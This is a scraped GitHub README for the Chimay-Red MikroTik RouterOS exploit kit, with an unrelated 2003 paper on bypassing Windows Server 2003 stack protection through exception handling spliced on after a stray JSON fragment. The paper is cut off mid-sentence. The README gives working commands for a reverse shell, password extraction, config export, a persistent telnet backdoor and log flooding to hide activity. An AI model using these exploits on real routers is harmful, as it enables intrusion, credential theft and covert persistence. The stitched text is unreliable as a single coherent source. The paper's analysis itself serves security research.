[37]Activity\n[38]Star (BUTTON)\n[39]Notifications\n* [40]Code\n* [41]Issues 23\n* [42]Pull requests 1\n* [43]Actions\n* [44]Projects 0\n* [45]Security\n* [46]Insights\n(BUTTON) Additional navigation options\n* [47]Code\n* [48]Issues\n* [49]Pull requests\n* [50]Actions\n* [51]Projects\n* [52]Security\n* [53]Insights\nBigNerd95\/Chimay-Red\nThis commit does not belong to any branch on this repository, and may\nbelong to a fork outside of the repository.\nmaster\nSwitch branches\/tags (BUTTON)\n____________________\n(BUTTON) Branches (BUTTON) Tags\nCould not load branches\nNothing to show\n[54]{{ refName }} default\n[55]View all branches\nCould not load tags\nNothing to show\n[56]{{ refName }} default\n[57]View all tags\nName already in use\n(BUTTON)\nA tag already exists with the provided branch name. Many Git commands\naccept both tag and branch names, so creating this branch may cause\nunexpected behavior. Are you sure you want to create this branch?\n(BUTTON) Cancel (BUTTON) Create\n[58]1 branch [59]0 tags\nCode\n* (BUTTON) Local\n* (BUTTON) Codespaces\n* Clone\n(button) HTTPS (button) GitHub CLI\nhttps:\/\/github.com\/B\nUse Git or checkout with SVN using the web URL.\ngh repo clone BigNer\nWork fast with our official CLI. [60]Learn more about the CLI.\n* [61]Open with GitHub Desktop\n* [62]Download ZIP\nSign In Required\nPlease [63]sign in to use Codespaces.\nLaunching GitHub Desktop\nIf nothing happens, [64]download GitHub Desktop and try again.\n(BUTTON)\nLaunching GitHub Desktop\nIf nothing happens, [65]download GitHub Desktop and try again.\n(BUTTON)\nLaunching Xcode\nIf nothing happens, [66]download Xcode and try again.\n(BUTTON)\nLaunching Visual Studio Code\nYour codespace will open once ready.\nThere was a problem preparing your codespace, please try again.\nLatest commit\nGit stats\n* [67]83 commits\nFiles\n[68]Permalink\nFailed to load latest commit information.\nType\nName\nLatest commit message\nCommit time\n[69]POCs\n[70]docs\n[71]tools\n[72]README.md\n[73]StackClash_mips.py\n[74]StackClash_resock_mips.py\n[75]StackClash_x86.py\n(BUTTON) View code\n____________________\n[76]Chimay-Red [77]Vulnerable versions [78]Proof of concepts\n[79]CrashPOC [80]StackClashPOC [81]Working exploits [82]StackClash_x86\n[83]Reverse shell: [84]Extract users and passwords [85]Export configs\n[86]StackClash_mips [87]LCD [88]Super Mario sound [89]Upload binaries\n[90]Persistent telnet server [91]StackClash_resock_mips [92]Upload\nbinaries without a reverse shell [93]Change boot logo [94]Hide logs\n[95]FAQ [96]Where does one get the chimay-red.py file, that this tool\nkit relies on? [97]I can't understand how the stack clash work. [98]x86\n[99]mips [100]Not wokring on some versions [101]HTTPS [102]Architecture\ndiscovery [103]Others architectures than x86 and MIPSBE\/SMIPS\n[104]Firmware upgrade persistence\n[105]README.md\nChimay-Red\nReverse engineering of Mikrotik exploit from Vault 7 CIA Leaks\nSee the [106]PDF for more info (not updated)\nVulnerable versions\nUntil RouterOS 6.38.4\nWhat's new in 6.38.5 (2017-Mar-09 11:32):\n!) www - fixed http server vulnerability;\nProof of concepts\nCrashPOC\nSimple crash sending -1 as content-length in post header\nStackClashPOC\nStack clash exploit using two threads, missing ROP chain\nWorking exploits\nAs the ROP is dynamically created, you have to extract the www binary\nfrom the RouterOS firmware.\n(It's placed in \/nova\/bin\/)\nCheck that the running version is the same.\nTo simplify extraction you can use:\n$ .\/tools\/getROSbin.py 6.38.4 x86 \/nova\/bin\/www www_binary\nStackClash_x86\nStack clash exploit using two threads with ROP chain to run bash\ncommands\nReverse shell:\nIn a shell:\n$ nc -l -p 1234\nIn another shell:\n$ .\/StackClash_x86.py 192.168.8.1 80 www_binary \"\/bin\/mknod \/ram\/f p; \/bin\/telne\nt 192.168.8.5 1234 < \/ram\/f | \/bin\/bash > \/ram\/f 2>&1\"\nWhere:\n* RouterOS IP: 192.168.8.1\n* PC IP: 192.168.8.5\nExtract users and passwords\n$ .\/StackClash_x86.py 192.168.8.1 80 www_binary \"cp \/rw\/store\/user.dat \/ram\/winb\nox.idx\"\n$ sleep 3 # (wait some seconds that www is restarted)\n$ curl -s http:\/\/192.168.8.1\/winbox\/index | .\/tools\/extract_user.py -\nExport configs\nYou can execute command in Mikrotik console with \/nova\/bin\/info.\nEg: \/nova\/bin\/info \"\/system reboot\" will reboot the system.\n$ .\/StackClash_x86.py 192.168.8.1 80 www_binary \"\/nova\/bin\/info '\/export' > \/ram\n\/winbox.idx\"\n$ sleep 20 # (it's a bit slow to execute \/export command)\n$ curl -s http:\/\/192.168.8.1\/winbox\/index\nStackClash_mips\nStack clash exploit using two threads with ROP chain + shell code to\nrun bash commands\nOn mips version of www the stack is RWX, so we can jump to the stack.\nYou can run the same bash command as the x86 version.\nLCD\nFunny command\n$ .\/tools\/getROSbin.py 6.38.4 mipsbe \/nova\/bin\/www www_binary\n$ .\/StackClash_mips.py 192.168.8.1 80 www_binary \"echo hello world > \/dev\/lcd\"\n[107]image\nSuper Mario sound\nDo not do it! ;-P\n$ .\/StackClash_mips.py 192.168.8.1 80 www_binary \"while [ true ]; do \/nova\/bin\/i\nnfo ':beep frequency=660 length=100ms;:delay 150ms;:beep frequency=660 length=10\n0ms;:delay 300ms;:beep frequency=660 length=100ms;:delay 300ms;:beep frequency=5\n10 length=100ms;:delay 100ms;:beep frequency=660 length=100ms;:delay 300ms;:beep\nfrequency=770 length=100ms;:delay 550ms;:beep frequency=380 length=100ms;:delay\n575ms;:beep frequency=510 length=100ms;:delay 450ms;:beep frequency=380 length=\n100ms;:delay 400ms;:beep frequency=320 length=100ms;:delay 500ms;:beep frequency\n=440 length=100ms;:delay 300ms;:beep frequency=480 length=80ms;:delay 330ms;:bee\np frequency=450 length=100ms;:delay 150ms;:beep frequency=430 length=100ms;:dela\ny 300ms;:beep frequency=380 length=100ms;:delay 200ms;:beep frequency=660 length\n=80ms;:delay 200ms;:beep frequency=760 length=50ms;:delay 150ms;:beep frequency=\n860 length=100ms;:delay 300ms;:beep frequency=700 length=80ms;:delay 150ms;:beep\nfrequency=760 length=50ms;:delay 350ms;:beep frequency=660 length=80ms;:delay 3\n00ms;:beep frequency=520 length=80ms;:delay 150ms;:beep frequency=580 length=80m\ns;:delay 150ms;:beep frequency=480 length=80ms;:delay 500ms;'; done\"\nUpload binaries\nTo upload busybox-mips in \/ram\/busybox\nIn a shell:\n$ wget https:\/\/busybox.net\/downloads\/binaries\/1.28.1-defconfig-multiarch\/busybox\n-mips\n$ { echo \"echo Uploading...\"; hexdump -v -e '\"echo -e -n \" 1024\/1 \"\\\\\\\\x%02X\" \"\n>> \/ram\/busybox\\n\"' busybox-mips | sed -e \"s\/\\\\\\\\\\\\\\\\x  \/\/g\"; } | nc -l -q 0 -p\n1234\nIn another shell (note that this is the reverse shell command):\n$ .\/StackClash_mips.py 192.168.8.1 80 www_binary \"\/bin\/mknod \/ram\/f p; \/bin\/teln\net 192.168.8.5 1234 < \/ram\/f | \/bin\/bash > \/ram\/f\"\nand wait until the connection automatically close.\n(Once the file is uploaded, run again reverse shell (this time only\nlistening with nc -l -p 1234) and you will find busybox inside \/ram\/)\nPersistent telnet server\nYou can run script at each boot by creating a bash script in\n\/flash\/etc\/rc.d\/run.d\/.\nPay attention to set execution permissions, or your router will stuck\non boot and you will have to restore the firmware!\nThis example enables a persistent telnet server on port 23000.\nIn a shell:\n$ wget https:\/\/busybox.net\/downloads\/binaries\/1.28.1-defconfig-multiarch\/busybox\n-mips\n$ { echo \"echo Installing...\"; hexdump -v -e '\"echo -e -n \" 1024\/1 \"\\\\\\\\x%02X\" \"\n>> \/flash\/bin\/busybox\\n\"' busybox-mips | sed -e \"s\/\\\\\\\\\\\\\\\\x  \/\/g\"; echo \"chmod\n777 \/flash\/bin\/busybox\"; echo \"\/flash\/bin\/busybox --install -s \/flash\/bin\/\"; ec\nho \"mkdir -p \/flash\/etc\/rc.d\/run.d\"; echo 'echo -e \"#!\/flash\/bin\/sh\\ntelnetd -p\n23000 -l sh\" > \/flash\/etc\/rc.d\/run.d\/S89own'; echo \"chmod 777 \/flash\/etc\/rc.d\/ru\nn.d\/S89own\"; echo \"\/nova\/bin\/info '\/system reboot'\"; echo \"echo Done! Rebooting.\n..\"; } | nc -l -p 1234\nIn another shell (note that this is the reverse shell command):\n$ .\/StackClash_mips.py 192.168.8.1 80 www_binary \"\/bin\/mknod \/ram\/f p; \/bin\/teln\net 192.168.8.5 1234 < \/ram\/f | \/bin\/bash > \/ram\/f\"\nand wait until Done! Rebooting... appears.\nOnce the router is up again:\n$ telnet 192.168.8.1 23000\nTrying 192.168.8.1...\nConnected to 192.168.8.1.\nEscape character is '^]'.\nMikroTik v6.38.4 (stable)\n\/ #\nStackClash_resock_mips\nReuse the http socket to spawn a shell, so you can have a shell without\na reverse connection.\n$ .\/tools\/getROSbin.py 6.38.4 mipsbe \/nova\/bin\/www www_binary\n$ .\/StackClash_resock_mips.py 192.168.8.1 80 www_binary\n[...]\nsh: turning off NDELAY mode\nGot root ;-)\nUpload binaries without a reverse shell\nTo upload busybox-mips in \/ram\/busybox\n$ wget https:\/\/busybox.net\/downloads\/binaries\/1.28.1-defconfig-multiarch\/busybox\n-mips\n$ .\/StackClash_resock_mips.py 192.168.8.1 80 www_binary busybox-mips \/ram\/busybo\nx\n[...]\nUploading busybox-mips in \/ram\/busybox...\nUpload done!\nsh: turning off NDELAY mode\nGot root ;-)\nchmod 777 \/ram\/busybox\n\/ram\/busybox\nBusyBox v1.28.1 (2018-02-15 14:34:02 CET) multi-call binary.\n[...]\nChange boot logo\nOnly RGB Bitmap 24 bit (not compressed) files are supported.\nMax size: 160px width, 76px height\nYou can find a sample [108]here\n$ .\/StackClash_resock_mips.py 192.168.8.1 80 www_binary docs\/logo.bmp \/flash\/boo\nt\/logo.bmp\n[...]\nUploading docs\/logo.bmp in \/flash\/boot\/logo.bmp...\nUpload done!\nsh: turning off NDELAY mode\nGot root ;-)\nreboot\n*** Connection closed by remote host ***\n[109]image\nHide logs\nTo remove logs after your post exploitation actions\n\/ # \/nova\/bin\/info \":for i from=1 to=1000 do={ :log info message='Some dummy inf\no' }\"\nFAQ\nWhere does one get the chimay-red.py file, that this tool kit relies on?\nThis is a reverse engineering of leaked CIA documentation.\nThere is no chimay-red.py publicly available.\nI can't understand how the stack clash work.\nI'll update the PDF as soon as I have enough time, anyway:\nWe know that:\n* each thread has 128KB of stack\n* each stack of each thread is stacked on the top of the previous\nthread.\nThanks to Content-Length and alloca macro we can control the Stack\nPointer and where the post data will be written.\nIf we send a Content-Length bigger than 128KB to socket of thread A,\nthe Stack Pointer will point inside the stack of another thread (B) and\nso the POST data (of thread A) will be written inside the stack of\nthread B (in any position we want, we only need to adjust the\nContent-Length value).\nSo now we can write a ROP chain in the stack of thread B starting from\na position where a return address is saved.\nWhen we close the socket of thread B, the ROP chain will start because\nthe function that is waiting for data will return (but on our modified\naddress).\nx86\nThe ROP chain construct \"system\" string and \"your_shell_cmd\" string\nlooking for chunks of strings inside the binary and concatenating them\nin an unused area of memory.\nThen we return to \"dlsym\" function (present in the PLT) passing as\nargument the address of just created string \"system\" to find the\naddress of \"system\" function.\nNow we can return to the address of system passing as argument the\naddress of the just created string \"your_shell_cmd\".\nmips\nDEP is disabled on this version of www, so I can execute the stack.\nBut I cannot use system function because \"\/bin\/sh\" is not present on\nthe file system, so I used execve directly.\nA small ROP (3 gadgets) find the address of a location on the stack\n(where I put the shell code), and then jump to that address.\nIn the shell code I make a fork (syscall 4002), then I populate an\narray of 4 pointers with the address of the strings \"\/bin\/bash\", \"-c\",\n\"your_shell_cmd\" using the leaked address of the stack (the last\npointer is left NULL).\nThen I populate a0, a1, a2 with rispectively: address of \"\/bin\/bash\",\naddress of the array populated at the preceeding step and the address\nof the NULL entry of the array.\nAt this point I can launch the syscall 4011 (execve) to execute my bash\ncommand.\nNot wokring on some versions\nI have no time to test all RouterOS versions.\nOn all stable version i tested (6.28, 6.27, 6.37.2, 6.37.3, 6.38.3,\n6.38.4) it is working (both x86 and mipsbe).\nOn 6.37.5 it isn't working, but I noticed that this is a bugfix\nversion.\nMaybe on all bugfix version my tool is not working (not verified).\nHTTPS\nI implemented the HTTPS version using ssl.wrap_socket and it is working\nif www has just started.\nBut if www has been running for some time I have to make it crash\nbefore running the exploit.\nIf I make www crash with HTTPS enabled, then www doesn't bind on HTTPS\nsocket any more...\nSo for now I didn't include HTTPS support in the public release because\nin most scenario it is totally NOT working and make the web server\nunreachable after the crash.\nArchitecture discovery\nI didn't find a way to discover the architecture via the web server\n(www).\nI think the CIA tool was using MNDP (Mikrotik Network Discovery\nProtocol), but it is only available in the same LAN, so it will not\nwork from a remote network.\nSo I didn't include the architecture discovery in my tool.\nYou have to test all the archtecture if you are remotely or use a MNDP\ntool if you in the same LAN (there are a lots of MNDP tools on github).\nOthers architectures than x86 and MIPSBE\/SMIPS\nI have no boards based on ARM, TILE, PowerPC and MMIPS, so I can't\ndebug the vulnerability on these versions.\n(Probably for the last one it is enough to convert the mipsbe addresses\nin little endian).\nIf you can support other arch then send a PR!\nFirmware upgrade persistence\nIt's possibile to make your rootkit persistent to firmware upgrade by\ncustomizing the initramfs...[110]more info\nAbout\nWorking POC of Mikrotik exploit from Vault 7 CIA Leaks\nResources\n[111]Readme\n[112]Activity\nStars\n[113]641 stars\nWatchers\n[114]52 watching\nForks\n[115]226 forks\n[116]Report repository\n[117]Releases\nNo releases published\n[118]Packages 0\nNo packages published\n[119]Contributors 3\n*\n*\n*\nLanguages\n* [120]Python 100.0%\nFooter\n\u00a9 2024 GitHub, Inc.\nFooter navigation\n* [121]Terms\n* [122]Privacy\n* [123]Security\n* [124]Status\n* [125]Docs\n* [126]Contact\n* (BUTTON) Manage cookies\n* (BUTTON) Do not share my personal information\n(BUTTON) You can\u2019t perform that action at this time.\n(BUTTON)"}
{"text":"Defeating the Stack Based Buffer Overflow Prevention\nMechanism of\nMicrosoft Windows 2003 Server.\nDavid Litchfield\n(david@ngssoftware.com)\n8th\nSeptember 2003\nAbstract\nThis paper presents several methods of bypassing the protection mechanism built into Microsoft\u2019s\nWindows 2003 Server that attempts to prevent the exploitation of stack based buffer overflows.\nRecommendations about how to thwart these attacks are made where appropriate.\nIntroduction\nMicrosoft is committed to security. I've been playing with Microsoft products, as far as security is\nconcerned, since 1997 and in the past year and a half or two I've seen a marked difference with\nsome very positive moves made. In a way they had to. With the public relations crisis caused by\nworms such as Code Red Microsoft needed to do something to stem the flow of customers\nmoving away from the Windows OS to other platforms. Microsoft's Trustworthy Computing push\nwas born out of this and, in my opinion, I think we as consumers are beginning to see the results;\nor ironically not see them - as the holes are just not appearing as they would if the security push\nwasn't there. We have, of course, seen at least one major security hole appear in Windows 2003\nServer, this being the DCOM IRemoteActivation buffer overflow discovered by the Polish security\nresearch group, the Last Stages of Delirium [http:\/\/www.lsd-pl.net]. We will see more; but I am\nconfident that the number of security vulnerabilities that will be discovered in Windows 2003\nServer will be a fraction of those found in Windows 2000. Acknowledging that there have been\nholes found and that, yes, more will come to light in the future this paper is going to look at how,\ncurrently, the stack based protection built into Windows 2003 Server to protect against buffer\noverflow vulnerability exploitation can be bypassed. The development of this mechanism is one of\nthe right moves made in the direction of security.\nAn Overview of Windows 2003 Stack Protection\nWindows 2003 Server was designed to be secure out of the box. As part of the security in depth\nmodel adopted by Microsoft for their latest Windows version a new stack protection mechanism\nwas incorporated into their compiler that was intended to help mitigate the risk posed by stack\nbased buffer overflow vulnerabilities by attempting to prevent their exploitation. Technically similar\nto Crispin Cowan's StackGuard, the Microsoft mechanism places a security cookie (or canary) on\nthe stack in front of the saved return address when a function is called. If a buffer local to that\nfunction is overflowed then, on the way to overwriting the saved return address, the cookie is also\noverwritten. Before the function returns the cookie is checked against an authoritative version of\nthe cookie stored in the .data section of the module where the function resides. If the cookies do\nnot match then it is assumed that the buffer has been overflowed and the process is stopped.\nThis security mechanism is provided by Visual Studio .NET - specifically the GS flag which is\nturned on by default.\nCurrently the stack protection built into Windows 2003 can be defeated. I have engineered two\nsimilar methods that rely on structured exception handling that can be used generically to defeat\nstack protection. Other methods of defeating stack protection are available, but these are\ndependent upon the code of the vulnerable function and involve overwriting the parameters\npassed to the function.\nHow is the cookie generated?\nWhen a module is loaded the cookie is generated as part of its start up routine. The cookie has a\n\fhigh degree of randomness which makes cookie prediction too difficult, especially if the attacker\nonly gets one opportunity to launch the attack. This code represents the manner in which the\ncookie is generated. Essentially the cookie is the result of a bunch of XOR operations on the\nreturn values of a number of functions:\n#include <stdio.h>\n#include <windows.h>\nint main()\n{\nFILETIME ft;\nunsigned int Cookie=0;\nunsigned int tmp=0;\nunsigned int *ptr=0;\nLARGE_INTEGER perfcount;\nGetSystemTimeAsFileTime(&ft);\nCookie = ft.dwHighDateTime ^ ft.dwLowDateTime;\nCookie = Cookie ^ GetCurrentProcessId();\nCookie = Cookie ^ GetCurrentThreadId();\nCookie = Cookie ^ GetTickCount();\nQueryPerformanceCounter(&perfcount);\nptr = (unsigned int)&perfcount;\ntmp = *(ptr+1) ^ *ptr;\nCookie = Cookie ^ tmp;\nprintf(\"Cookie: %.8X\\n\",Cookie);\nreturn 0;\n}\nThe cookie is an unsigned int and once it has been generated it is stored in the .data section of\nthe module. The .data section memory is writable and one of the attacks we'll look at later will\ninvolve overwriting this authoritative cookie with a known value and overwriting the stack cookie\nwith the same value. A good recommendation to Microsoft would be to mark the 32 bits of\nmemory where this cookie is stored as read-only using VirtualProtect. This will prevent the attack\nI've just mentioned.\nAn in-depth look at what happens if the cookies do not match.\nIf a local buffer is overflowed and the cookie is overwritten what happens? Well, when the check\nis performed and it fails the code checks to see if a security handler has been defined. This\nsecurity handler exists so that the program's developers can take actions such as log things\nbefore terminating the process if they see fit. A pointer to this handler is stored in the .data\nsection of the module. Later on we shall see how this can pose a problem. It is not necessary to\ndefine a security handler and, being honest, it is probably safer not to as any code that runs after\nthe buffer is overflowed could be compromised. It is, in my opinion unsafe to do anything other\nthan to trap to the kernel and terminate the process there and then. Even if no security handler\nhas been defined there is still a raft of code that is executed by the process. The default steps\ntaken if the cookies do not match are to set the UnhandledExceptionFilter to 0x00000000 and call\nthe UnhandledExceptionFilter function. This starts the shutdown of the process. The\nUnhandledExceptionFilter function performs a number of tasks before the process is finally killed.\nAmongst other things, this function loads the faultrep.dll library and calls the ReportFault function.\nEvery time you see a \"Report this fault to Microsoft\" popup - this is that function at work. As I said\na few moments ago it is too dangerous to run any code after an overflow has occurred. Later we'll\nlook at how even the actions performed by the UnhandledExceptionFilter function can be abused\nto gain control of an overflowed process. Whilst I am aware that the \"Report a fault\" has been\ninvaluable to Microsoft and the bug fixing process, in my opinion, Microsoft should introduce a\nnew kernel function, an NtTerminateProcessOnStackOverflow if you will, that deals with such\n\fsituations and this should be called as soon as the cookie check fails. Subverting a kernel\nfunction from user mode is going to be difficult to say the least and provides less \"opportunities\"\nthan running termination code in user mode.\nWindows and Exception Handling\nException handling is built into the Windows operating system and helps make applications more\nrobust. When a problem occurs such as a memory access violation or divide by zero error an\nexception handler can be coded to deal with such situations and allow the process to recover and\ncontinue execution as normal. Even if the program developer has not set up any exception\nhandling every thread of every process has at least one handler that is setup on thread\ninitialization. Information about exception handlers is stored on the stack in an\nEXCEPTION_REGISTRATION structure and a pointer to the first EXCEPTION_REGISTRATION\nstructure is stored in the Thread Environment Block.\nFigure 1.\nAs can be seen in Figure 1 the EXCEPTION_REGISTRATION structure has two elements, a\npointer to the next EXCEPTION_REGISTRATION structure and a pointer to the exception\nhandler. When overflowing stack based buffers on Windows platforms one of the mechanisms\navailable to the attacker to gain control of the process is to overwrite this\nEXCEPTION_REGISTRATION structure \u2013 setting the pointer to the handler to a block of code or\nan instruction that will redirect the flow of execution back to the buffer.\nMicrosoft has recognized this as a problem and with Windows 2003 Server structured exception\nhandling has been modified in an attempt to prevent such attacks. Exception handlers are now\nregistered and the addresses of any handlers in a module are stored in the Load Configuration\nDirectory of the module. When an exception occurs, before the handler is executed its address is\nchecked against the list of registered handlers and it will not be executed if no match is found. If\nhowever the address of the handler, as taken from the EXCEPTION_REGISTRATION structure,\nis outside the address range of a loaded module then it is still executed. A final point to note is\nthat if the address of the handler is on the stack then it will not be executed. This prevents attacks\nwhere the pointer to the exception handler is overwritten with a direct stack address. If the\naddress of the \u201chandler\u201d is a heap address then it will be called however.\nThis provides the attacker with two good possibilities and a third, more difficult and code\/process\ndependent option. On overflowing a local buffer if, as well as overwriting the cookie and the saved\nreturn address, an attacker overwrites the EXCEPTION_REGISTRATION structure then they can\nattempt to gain control of the process by either setting the pointer to the handler to an already\nregistered handler and abusing that to gain control or alternatively, overwrite the pointer to the\nhandler with an address that is outside the range of a loaded module and points to a block of\ncode or instruction that allows the attacker to get back into their buffer. As we\u2019ll see these two\noptions provide two generic mechanisms for bypassing the stack protection of Windows 2003\n\fServer. The third option is to \u201cload\u201d a buffer on the heap, if possible, with exploit code and\noverwrite the pointer to the handler with the address of the heap buffer.\nDefeating Stack Protection through Structure Exception Handling\nBefore we can abuse structured exception handling as a mechanism to defeat stack protection\nwe need to generate an exception before the cookie is checked. There are two ways this might\nhappen \u2013 one we can control and the other is dependent of the code of the vulnerable function. In\nthe latter case, if we overflow other data, for example parameters that were pushed onto the\nstack to the vulnerable function and these are referenced before the cookie check is performed\nthen we could cause an exception here by setting this data to something that will cause an\nexception. If the code of the vulnerable function has been written in such a way that no\nopportunity exists to do this, then we have to attempt to generate our own exception. We can do\nthis by attempting to write beyond the end of the stack. This will generate an exception. See\nFigure 2.\nFigure 2.\nOverwriting the pointer to the exception handler with an address outside the address\nrange of a loaded module.\nRecall that, before an exception handler is executed, its address is first checked against a list of\nregistered handlers. If the address of the exception handler is not in the address range of any\nloaded module then it is called. Why this is so I do not know. My recommendation to Microsoft\nwould be to not to do this. It provides an attacker with a method to bypass any protection. All an\nattacker needs to do is find an instruction or block of instructions that will redirect execution back\n\finto the user supplied data at an address not within the range of a module. If we examine the\nstate of the stack and registers when an exception handler has been called we can see that none\nof the registers contain the address of anywhere in the user supplied data. If any did then all the\nattacker would need to do would be to find a \u201ccall register\u201d or \u201cjmp register\u201d instruction \u2013 but none\nof the registers do point anywhere useful. If, however, we examine the state of the stack on the\ncalling of an exception handler we can find many pointers to the EXCEPTION_RGISTRATION\nstructure that has been overflowed:\nESP + 8 + 14 + 1C + 2C +44 +50\nEBP + 0C + 24 + 30 - 04 - 0C - 18\nTable 1.\nIf an attacker can find an instruction that executes a\nCALL DWORD PTR [ESP+NN]\nCALL DWORD PTR [EBP+NN]\nCALL DWORD PTR [EBP-NN]\nJMP DWORD PTR [ESP+NN]\nJMP DWORD PTR [EBP+NN]\nJMP DWORD PTR [EBP-NN]\nwhere NN is one of the offsets found in Table 1 above, at an address outside of the address\nrange of a loaded module then it will be executed on the event of an exception. This will redirect\nthe flow of execution to the \u201cowned\u201d exception registration structure. As the first 32 bits of this\nstructure is a pointer to the next structure the attacker can load this with code that will perform a\nshort jump over the pointer to the \u201chandler\u201d as in Figure 3.\nFigure 3.\nThe other alternative is to find a \u201cpop reg, pop reg, ret\u201d instruction block outside of the address\nrange of a loaded module. This works as we can find a pointer to the\nEXCEPTION_REGISTRATION structure at ESP + 8. Two pops of the stack will leave this pointer\nat ESP so when the RET is executed we land back in the structure. Again we would need to\nperform the short jump. One can search the address space of a vulnerable process for such\ninstruction blocks by injecting a small bit of code that will load a DLL that contains the code to do\nthe search. See Appendix A. The output of the code in Appendix A shows three interesting\npossibilities where suitable instructions can be found outside of the address range of a loaded\nmodule. Firstly, there is a \u201cCALL DWORD PTR[EBP+30h] at address 0x001B0B0B and two sets\n\fof \u201cpop, pop, ret\u201d at 0x7FFC0AC5 and 0x7FFC0AFC.\nThese three addresses are all outside the range of a loaded module. The CALL DWORD\nPTR[EBP+30h] at 0x001B0B0B isn\u2019t actually an instruction. It\u2019s just the right bytes that form this\ninstruction \u2013 0xFF5530. If we analyze the memory of a process using vadump.exe (Virtual\nAddress Dump - http:\/\/www.microsoft.com\/windows2000\/techinfo\/reskit\/tools\/existing\/vadump-\no.asp) we can see that this is within the address range of the memory mapped data file,\nUNICODE.NLS. Whilst UNICODE.NLS is mapped in some processes it is not in others. The base\naddress that UNICODE.NLS is loaded at appears to be the same for each instance of the same\ngiven process, even across boots and across systems, but may vary from different process to\nprocess. For example UNICODE.NLS will always be mapped at 0x00260000 for a given a\nconsole application but at 0x001A0000 for svchost.exe. The CALL DWORD PTR[EBP+0x30] can\nbe found 0x10B0B bytes offset from the start of the base.\nPROCESS BASE ADDRESS NUMBER\nSERVICES.EXE 0x001A0000 -\nLSASS.EXE 0x001A0000 -\nSVCHOST.EXE 0x001A0000 All 8 instances\nSPOOLSV.EXE 0x001A0000 -\nMSDTC.EXE 0x001A0000 -\nDFSSVC.EXE 0x001A0000 -\nWMIPRVSE.EXE 0x001A0000 All 2 instances\nW3WP.EXE 0x001A0000 -\nCSRSS.EXE 0x00270000 -\nSMSS.EXE UNICODE.NLS Not Mapped -\nINETINFO.EXE UNICODE.NLS Not Mapped -\nCIDAEMON.EXE UNICODE.NLS Not Mapped -\nCISVC.EXE UNICODE.NLS Not Mapped -\nTable 2.\nTable 2 lists some of the services that could be found running on a Windows 2003 Server\nmachine. As can be seen, most of the services that do map UNICODE.NLS do so at address\n0x001A0000 locating the \u201cCALL DWORD PTR [EBP+0x30]\u201d instruction at 0x001B0B0B.\nThe other two addresses, that is those where we find the POP, POP, RET instruction block, are\nslightly different. Vadump shows these to be \u201cUNKNOWN_MAPPED\u201d but there is a problem with\nthese addresses. Whilst they are the same in every process \u2013 even across reboots \u2013 they are not\nat the same location on every system. These addresses, 0x7FFC0AC5 and 0x7FFC0AFC, were\ntaken from a Sony VIAO PCG-R6000 laptop but a Dell running Windows 2003 Server has these\n\finstructions at address 0x7FFC0731 and 0x7FFC0914. A Sony VIAO PCG-Z1RSP laptop has\nthese instructions at address 0x7FFC063A and 0x7FFC0C16. A VMWare image of Windows\n2003 Server has a pop, pop, ret at 0x7FFC05A4. The location of these addresses seem to be\nhardware related but due to the instability of the location of these instructions they would be\nuseful for local attacks only; unless of course you knew the exact spec of the hardware of the\nremote system. This means that an attacker would need to rely on the \u201cCALL DWORD PTR\n[EBP+0x30]\u201d after first verifying the address of UNICODE.NLS in the vulnerable process on one\nof their own systems. As this address is more than likely to contain a NULL instead of jumping\nforward the attacker would need to jump backwards. This NULL could cause a few problems in\ncertain cases, however. One can guarantee an exception with an overflow by attempting to write\nbeyond the end of the stack. With this NULL though, generating an exception in such a way won\u2019t\nbe possible, unless of course the overflow is Unicode in nature as we saw in the DCOM overflow.\nIf the overflow is not Unicode in nature then the attacker must either hope that the code access\nviolates on its own with a variable overwrite (see the Code Specific section) or find an instruction\n(block) at an address that does not contain a NULL.\nThe current way of handling exceptions is too dangerous. It is not safe to call an \u201cexception\nhandler\u201d if it is outside of the address range of a loaded module; there is too much scope for\nabuse and allows an attacker to bypass the stack protection. My best guess here is that there\nmaybe some Microsoft application that does place the code of an exception handler outside the\naddress range of a loaded module; onto the heap for example. Perhaps we\u2019re not just dealing\nwith technology problems here \u2013 there may be political issues at play as well. If, for example, one\nof the Microsoft Office applications placed an exception handler on the heap, then modifying the\nway structured exception handling currently works would break it; and this, politically, would not\ndo. If this is the case then it is standing in the way of providing a more restrictive solution \u2013 which\nis what we need.\nAbusing an Existing, Registered Exception Handler\nAssuming there were no such instruction(s) outside the address range of a module is there any\nscope to abuse an existing, registered handler to bypass stack protection? The answer to this is\ncurrently is yes. There is a registered handler in the Load Configuration Directory of NTDLL.DLL\nwith an address of 0x77F45A34. If we disassemble this exception handler we find the following\npertinent code:\n77F45A3F mov ebx,dword ptr [ebp+0Ch]\n..\n77F45A61 mov esi,dword ptr [ebx+0Ch]\n77F45A64 mov edi,dword ptr [ebx+8]\n..\n77F45A75 lea ecx,[esi+esi*2]\n77F45A78 mov eax,dword ptr [edi+ecx*4+4]\n..\n77F45A8F call eax\nAt address 0x77F45A3F the value pointed to by EBP+0Ch is moved into EBX. This value is a\npointer to the \u201cowned\u201d EXCEPTION_REGISTRATION structure. The DWORD value pointed to\n0x0C bytes past EBX is then moved into ESI. As we've overflowed the\nEXCEPTION_REGISTRATION structure and beyond it we control this DWORD, and\nconsequently, we \u201cown\u201d ESI. Next, the DWORD value pointed to 0x08 bytes past EBX is moved\ninto EDI. Again, we control this. The effective address of ESI + ESI * 2 (equivalent to ESI * 3) is\nthen loaded into ECX. As we own ESI we can guarantee the value that goes into ECX. Then the\naddress pointed to by EDI, which we also own, added to ECX * 4 + 4, is moved into EAX. EAX is\nthen called. As we completely control what goes into EDI and ECX (through ESI) we can control\nwhat is moved into EAX and therefore can direct the process to execute our code. The only\n\fdifficulty is finding an address that holds a pointer to our code. We need to ensure that\nEDI+ECX*4+4 matches this address so the pointer to our code is moved into EAX and then\ncalled. For this to succeed all that is needed is a pointer to the \u201cowned\u201d\nEXCEPTION_REGISTRATION structure. We can find this on the stack, as it is linked through\nanother EXCEPTION_REGISTRATION structure.\nAs an example of this let\u2019s say there\u2019s a pointer to the owned EXCEPTION_REGISTRATION\nstructure at address 0x005CF3E4. If the attacker were to set 0x0C bytes past their\nEXCEPTION_REGISTRATION structure to 0x40001554 (this will go into ESI) and 0x08 bytes\npast it to 0x005BF3F0 (this will go into EDI) then after all the multiplication and addition they\u2019re\nleft with 0x005CF3E4. The DWORD value pointed to by this is then moved into EAX and then\ncalled. On EAX being called the attacker lands in their EXCEPTION_REGISTRATION structure\nat what would be the pointer to the next EXCEPTION_REGISTRATION structure. If they were to\nput code in here that performs a short jmp 14 bytes from the current location then they would\njump over the crud they've needed to set to get execution to this point. (Incidently, the values\nused here are taken from one of the exploits I wrote for the DCOM overflow on Windows 2003\nServer; hence the use of NULLs in the addresses. This overflow was Unicode in nature. For 